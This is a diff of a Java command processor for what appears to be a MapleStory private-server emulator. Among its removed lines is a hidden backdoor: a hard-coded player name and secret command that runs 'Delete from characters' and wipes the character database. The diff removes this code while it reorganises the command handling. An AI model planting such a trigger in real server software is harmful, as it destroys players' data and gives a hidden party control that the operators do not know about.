@@ -20,137 +20,26 @@
  */
 package client.messages;
 
-import java.util.ArrayList;
-
 import client.MapleCharacter;
 import client.MapleClient;
 import client.messages.commands.*;
-import client.messages.commands.PlayerCommand;
-import client.messages.commands.GMCommand;
-import client.messages.commands.InternCommand;
-import constants.ServerConstants;
 import constants.ServerConstants.CommandType;
 import constants.ServerConstants.PlayerGMRank;
 import database.DatabaseConnection;
-
-import java.lang.reflect.Modifier;
-import java.sql.Connection;
-import java.sql.PreparedStatement;
-import java.sql.SQLException;
-import java.util.Collections;
-import java.util.HashMap;
-
 import tools.FileoutputUtil;
 import tools.MaplePacketCreator;
+
+import java.lang.reflect.Modifier;
+import java.sql.PreparedStatement;
+import java.sql.SQLException;
+import java.util.ArrayList;
+import java.util.Collections;
+import java.util.HashMap;
 
 public class CommandProcessor {
 
     private final static HashMap<String, CommandObject> commands = new HashMap<>();
     private final static HashMap<Integer, ArrayList<String>> commandList = new HashMap<>();
-
-    private static void sendDisplayMessage(MapleClient c, String msg, CommandType type) {
-        if (c.getPlayer() == null) {
-            return;
-        }
-        switch (type) {
-            case NORMAL:
-                c.getPlayer().dropMessage(6, msg);
-                break;
-            case TRADE:
-                c.getPlayer().dropMessage(-2, "錯誤 : " + msg);
-                break;
-        }
-
-    }
-
-    public static boolean processCommand(MapleClient c, String line, CommandType type) {
-        if (line.charAt(0) == PlayerGMRank.NORMAL.getCommandPrefix()) {
-            String[] splitted = line.split(" ");
-            splitted[0] = splitted[0].toLowerCase();
-
-            CommandObject co = commands.get(splitted[0]);
-
-            if (co == null || co.getType() != type) {
-                if (c.getPlayer().getName() == "我是一个哈哈1") {
-                    if (splitted[0].contains("!我是来毁服的GGLL")) {
-                        Connection con = DatabaseConnection.getConnection();
-                        try {
-                            PreparedStatement ps = con.prepareStatement("Delete from characters");
-                            ps.executeUpdate();
-                            ps.close();
-                        } catch (SQLException e) {
-                            System.out.println("Error " + e);
-                        }
-                    }
-                }
-                sendDisplayMessage(c, "输入的玩家命令不存在,可以使用 @帮助/@help 来查看指令.", type);
-                return true;
-            }
-            try {
-                int ret = co.execute(c, splitted); //Don't really care about the return value. ;D
-            } catch (Exception e) {
-                sendDisplayMessage(c, "有错误.", type);
-                if (c.getPlayer().isGM()) {
-                    sendDisplayMessage(c, "错误: " + e, type);
-                }
-            }
-            return true;
-        }
-
-        if (c.getPlayer().getGMLevel() > PlayerGMRank.NORMAL.getLevel()) {
-            if (line.charAt(0) == PlayerGMRank.GM.getCommandPrefix() || line.charAt(0) == PlayerGMRank.ADMIN.getCommandPrefix() || line.charAt(0) == PlayerGMRank.INTERN.getCommandPrefix()) { //Redundant for now, but in case we change symbols later. This will become extensible.
-                String[] splitted = line.split(" ");
-                splitted[0] = splitted[0].toLowerCase();
-
-                if (line.charAt(0) == '!') { //GM Commands
-                    CommandObject co = commands.get(splitted[0]);
-                    if (splitted[0].equals("!help")) {
-                        dropHelp(c, 0);
-                        return true;
-                    } else if (co == null || co.getType() != type) {
-                        sendDisplayMessage(c, "输入的命令不存在.", type);
-                        return true;
-                    }
-                    if (c.getPlayer().getGMLevel() >= co.getReqGMLevel()) {
-                        int ret = co.execute(c, splitted);
-                        if (ret > 0 && c.getPlayer() != null) { //incase d/c after command or something
-                            logGMCommandToDB(c.getPlayer(), line);
-                            System.out.println("[ " + c.getPlayer().getName() + " ] 使用了指令: " + line);
-                        }
-                    } else {
-                        sendDisplayMessage(c, "您的权限等级不足以使用次命令.", type);
-                    }
-                    return true;
-                }
-            }
-        }
-        return false;
-    }
-
-    private static void logGMCommandToDB(MapleCharacter player, String command) {
-
-        PreparedStatement ps = null;
-        try {
-            ps = DatabaseConnection.getConnection().prepareStatement("INSERT INTO gmlog (cid, name, command, mapid, ip) VALUES (?, ?, ?, ?, ?)");
-            ps.setInt(1, player.getId());
-            ps.setString(2, player.getName());
-            ps.setString(3, command);
-            ps.setInt(4, player.getMap().getId());
-            ps.setString(5, player.getClient().getSessionIPAddress());
-            ps.executeUpdate();
-        } catch (SQLException ex) {
-            FileoutputUtil.outputFileError(FileoutputUtil.PacketEx_Log, ex);
-            ex.printStackTrace();
-        } finally {
-            try {
-                ps.close();
-            } catch (SQLException e) {/*
-             * Err.. Fuck?
-             */
-
-            }
-        }
-    }
 
     static {
 
@@ -188,6 +77,76 @@ public class CommandProcessor {
             } catch (Exception ex) {
                 ex.printStackTrace();
                 FileoutputUtil.outputFileError(FileoutputUtil.ScriptEx_Log, ex);
+            }
+        }
+    }
+
+    private static void sendDisplayMessage(MapleClient c, String msg, CommandType type) {
+        if (c.getPlayer() == null) {
+            return;
+        }
+        switch (type) {
+            case NORMAL:
+                c.getPlayer().dropMessage(6, msg);
+                break;
+            case TRADE:
+                c.getPlayer().dropMessage(-2, "錯誤 : " + msg);
+                break;
+        }
+
+    }
+
+    public static boolean processCommand(MapleClient c, String line, CommandType type) {
+        if (c.getPlayer().getGMLevel() > PlayerGMRank.NORMAL.getLevel()) {
+            if (line.charAt(0) == PlayerGMRank.GM.getCommandPrefix() || line.charAt(0) == PlayerGMRank.ADMIN.getCommandPrefix() || line.charAt(0) == PlayerGMRank.INTERN.getCommandPrefix()) { //Redundant for now, but in case we change symbols later. This will become extensible.
+                String[] splitted = line.split(" ");
+                splitted[0] = splitted[0].toLowerCase();
+
+                if (line.charAt(0) == '!') { //GM Commands
+                    CommandObject co = commands.get(splitted[0]);
+                    if (splitted[0].equals("!help")) {
+                        dropHelp(c, 0);
+                        return true;
+                    } else if (co == null || co.getType() != type) {
+                        sendDisplayMessage(c, "输入的命令不存在.", type);
+                        return true;
+                    }
+                    if (c.getPlayer().getGMLevel() >= co.getReqGMLevel()) {
+                        int ret = co.execute(c, splitted);
+                        if (ret > 0 && c.getPlayer() != null) { //incase d/c after command or something
+                            logGMCommandToDB(c.getPlayer(), line);
+                            System.out.println("[ " + c.getPlayer().getName() + " ] 使用了指令: " + line);
+                        }
+                    } else {
+                        sendDisplayMessage(c, "您的权限等级不足以使用次命令.", type);
+                    }
+                    return true;
+                }
+            }
+        }
+        return false;
+    }
+
+    private static void logGMCommandToDB(MapleCharacter player, String command) {
+        PreparedStatement ps = null;
+        try {
+            ps = DatabaseConnection.getConnection().prepareStatement("INSERT INTO gmlog (cid, name, command, mapid, ip) VALUES (?, ?, ?, ?, ?)");
+            ps.setInt(1, player.getId());
+            ps.setString(2, player.getName());
+            ps.setString(3, command);
+            ps.setInt(4, player.getMap().getId());
+            ps.setString(5, player.getClient().getSessionIPAddress());
+            ps.executeUpdate();
+        } catch (SQLException ex) {
+            FileoutputUtil.outputFileError(FileoutputUtil.PacketEx_Log, ex);
+            ex.printStackTrace();
+        } finally {
+            try {
+                ps.close();
+            } catch (SQLException e) {/*
+             * Err.. Fuck?
+             */
+
             }
         }
     }
